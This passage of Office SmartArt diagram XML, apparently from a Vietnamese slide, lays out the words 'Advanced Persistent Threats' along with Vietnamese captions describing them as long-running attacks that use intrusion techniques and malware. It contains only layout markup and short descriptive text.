      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="textNode" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{834C08AE-444E-F446-B0BF-3487CD228505}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="compChildNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="theInnerList" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{331622DA-667B-3D42-86F2-0516235F2E15}" type="pres">
      <dgm:prSet presAssocID="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" presName="childNode" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{237E2EFB-A677-D844-819C-BBDED44A17C5}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="aSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="aNode" presStyleLbl="bgShp" presStyleIdx="2" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DE64535E-28E3-9144-82ED-ED0F42D2AAEE}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="textNode" presStyleLbl="bgShp" presStyleIdx="2" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1D30DF71-C875-B746-BD57-739E889A911A}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="compChildNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="theInnerList" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}" type="pres">
      <dgm:prSet presAssocID="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" presName="childNode" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{E1736B09-914B-3149-8C3C-C974F30C88A6}" type="presOf" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{635717B1-99B8-854E-8F70-444337E2E550}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{54900D11-8370-4BAA-83B1-119FD9DF4DD7}" type="presOf" srcId="{87CA5203-886D-476C-8773-A8952AD60B34}" destId="{A9014140-D8A6-4978-AA18-33E39D13DCC3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C180D234-5927-BC40-BCEA-43D33D0E2CFA}" type="presOf" srcId="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" destId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{D3860F36-28E4-1442-B86C-E63CCC3FE716}" type="presOf" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{DE64535E-28E3-9144-82ED-ED0F42D2AAEE}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{329B575F-8B76-3B4B-9BD9-38FDE9A2A8A5}" type="presOf" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{E367BE70-C50A-6A43-8AFA-7CF7E142477B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{8B9D4070-B4CC-F34F-B8B4-4F4F74F1B1AC}" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" srcOrd="0" destOrd="0" parTransId="{CC53E30A-CA09-8949-8B35-41834609C58A}" sibTransId="{2EFD9D0C-B667-974D-8EEE-876172C6068D}"/>
    <dgm:cxn modelId="{4CD5B385-F4AE-6B4E-A557-3E5FBE186B3A}" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{59372874-7672-E146-A97A-F29BFB4A2140}" srcOrd="0" destOrd="0" parTransId="{AFA358CC-DE03-B14E-9AD6-513B9ED3EF89}" sibTransId="{EF9C2E62-DCA0-D848-903A-2D9F9C026F51}"/>
    <dgm:cxn modelId="{98DE5C93-DBEB-254C-B03C-54648A10B03D}" type="presOf" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{1F9EAEE1-B141-8149-B598-A2FC9726C17B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{4C7687B9-48C1-4798-BD8D-B09C9810512E}" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{87CA5203-886D-476C-8773-A8952AD60B34}" srcOrd="0" destOrd="0" parTransId="{7A55C87C-9179-41CE-AB58-0581F5C13054}" sibTransId="{4499DD0E-95A3-44B9-904B-72EF79CA9F34}"/>
    <dgm:cxn modelId="{752AFBC6-0A6F-E64D-8873-6214DED38720}" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" srcOrd="2" destOrd="0" parTransId="{E5862108-903B-1C4B-9377-81DD29E52B29}" sibTransId="{B6EE5F2B-A910-414E-A3BF-34358F619072}"/>
    <dgm:cxn modelId="{21896DD5-9159-5A48-95C3-0628E40AD5D5}" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" srcOrd="0" destOrd="0" parTransId="{47925BA2-F0AA-1349-914E-93DB729B1439}" sibTransId="{DEA69FE8-A421-8F40-BC0D-0B81014C6103}"/>
    <dgm:cxn modelId="{09ECF6DD-E119-374A-AA19-1EFBB9A7AE59}" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{92F30862-F847-FC4F-9375-31010EECD883}" srcOrd="1" destOrd="0" parTransId="{70431AB4-DF3F-4645-82B4-916A5B03ED2B}" sibTransId="{BC376F47-B3AB-B74F-80ED-DB7222180FD2}"/>
    <dgm:cxn modelId="{0DFD91DF-68AD-E649-B09C-E5EAFAEF15BB}" type="presOf" srcId="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" destId="{331622DA-667B-3D42-86F2-0516235F2E15}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{CE6F23E2-A7A9-1447-B201-56CC65F45CC6}" type="presOf" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{200D4077-F322-A54F-A959-16520676AF19}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{9D4DE0EB-08A6-3544-A58B-08122AF0FDBE}" type="presOf" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{E415A12E-187B-9149-B76A-23CD314DDAC8}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{791A79EE-56E7-A044-A12E-44CBF852734D}" type="presOf" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{5AACC05E-5AB9-0E49-99B2-6E1BA6A41FDB}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{9FAD7FA9-8F47-104B-A9DC-EA081AA4F40E}" type="presParOf" srcId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" destId="{1F9EAEE1-B141-8149-B598-A2FC9726C17B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C8412F36-AC01-7A44-9697-143DB9CEC9BA}" type="presParOf" srcId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" destId="{E367BE70-C50A-6A43-8AFA-7CF7E142477B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{EA56AD11-7104-9640-9FC3-D2804E8F4001}" type="presParOf" srcId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" destId="{6AC02209-CF3A-0249-91E1-9F1A42D58FAE}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{46A30A50-3737-8B4D-B495-F1122505DBF8}" type="presParOf" srcId="{6AC02209-CF3A-0249-91E1-9F1A42D58FAE}" destId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{0F4D2BBE-62B8-453C-AD9E-9976670588FE}" type="presParOf" srcId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" destId="{A9014140-D8A6-4978-AA18-33E39D13DCC3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{D328F87F-21F5-714F-9FB7-F211915773E5}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{12284197-3CBC-A34B-949D-A231607C1E8B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{BCE740ED-04BF-434E-8FEA-78F3668C6118}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{BBE8E148-330B-2A45-91F3-7D6EB629A869}" type="presParOf" srcId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" destId="{200D4077-F322-A54F-A959-16520676AF19}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{CB56E221-F88E-FD47-9496-8D41D0D28A88}" type="presParOf" srcId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" destId="{E415A12E-187B-9149-B76A-23CD314DDAC8}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{58069DFD-337B-484D-81D4-6343DAFF6EED}" type="presParOf" srcId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" destId="{834C08AE-444E-F446-B0BF-3487CD228505}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{6B826E0E-A1E1-9D4F-9A76-1A15C480919D}" type="presParOf" srcId="{834C08AE-444E-F446-B0BF-3487CD228505}" destId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{14577FE3-E79A-1949-B26E-0D485D2BD999}" type="presParOf" srcId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" destId="{331622DA-667B-3D42-86F2-0516235F2E15}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C7F4E4E1-9BE9-DD45-B710-B33855AEC625}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{237E2EFB-A677-D844-819C-BBDED44A17C5}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{E68A7686-B35C-E54D-A2AA-94895E1983D7}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C4DC8DD8-8E37-A449-AF53-8C2D54A3BADC}" type="presParOf" srcId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" destId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{4903066D-4C63-D442-B313-F0A620CD3979}" type="presParOf" srcId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" destId="{DE64535E-28E3-9144-82ED-ED0F42D2AAEE}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{A4CFDEB2-3173-414C-8A15-BB6822B38D19}" type="presParOf" srcId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" destId="{1D30DF71-C875-B746-BD57-739E889A911A}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{F859185D-567E-B84D-A45C-B6DA4CE3C958}" type="presParOf" srcId="{1D30DF71-C875-B746-BD57-739E889A911A}" destId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{79536E11-1C43-1E46-BFA7-2611914FE8CB}" type="presParOf" srcId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" destId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}" srcOrd="0"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0218D2D0-3BA3-4395-9875-81487796F48B}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5" loCatId="process" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent2_1" csCatId="accent2" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8FA528DD-7220-44AD-97F3-D4A546086898}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Advanced</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" b="1" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1825BC1D-A53E-41AB-BB23-7D855D4081B6}" type="parTrans" cxnId="{8FCE32BF-8DF1-44D5-809F-3ACB62D150D3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1BA1265C-9583-4F55-B613-1E366D40024D}" type="sibTrans" cxnId="{8FCE32BF-8DF1-44D5-809F-3ACB62D150D3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1CF1123F-09BA-4DB9-9951-C45A57D73BC0}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Persistent</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" b="1" dirty="0"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C43F75D8-65D6-4C75-851C-B67A66B268A3}" type="parTrans" cxnId="{23C86D17-79DF-43CB-9FB4-515210247EA2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{701F270F-451D-4A1F-A80E-EA6FCBE15305}" type="sibTrans" cxnId="{23C86D17-79DF-43CB-9FB4-515210247EA2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4BBACB04-02FF-4B29-ACDD-E956FC927781}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Threats</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" b="1" dirty="0"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{71A416C0-389E-4114-9CAC-7C3893B11C9F}" type="parTrans" cxnId="{B0D4DA4F-17E0-42A6-8D97-9D7CA4487A12}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{320FD54D-5911-4141-822B-5DC15D401370}" type="sibTrans" cxnId="{B0D4DA4F-17E0-42A6-8D97-9D7CA4487A12}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{74CD2459-A132-44D2-BD42-6304D159151D}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="vi-VN" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Sử dụng bởi những kẻ tấn công </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>với</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> nhiều công nghệ xâm nhập và phần mềm </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" i="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>độc hạ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" i="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>i</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" i="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>. </a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" i="1" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A72D74DA-C7B8-445B-AF00-7D9C2931D5E6}" type="parTrans" cxnId="{93575AE1-B351-43D0-BFA7-3BB6EEE11EFE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B66EDF7F-FD53-462D-831B-BD167FF5B797}" type="sibTrans" cxnId="{93575AE1-B351-43D0-BFA7-3BB6EEE11EFE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0CB32042-ED3C-400A-8C61-D8CCF67B96D7}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Tấn</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>công</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>trong</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>một</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>khoảng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>thời</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>gian</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>dài</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đối</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
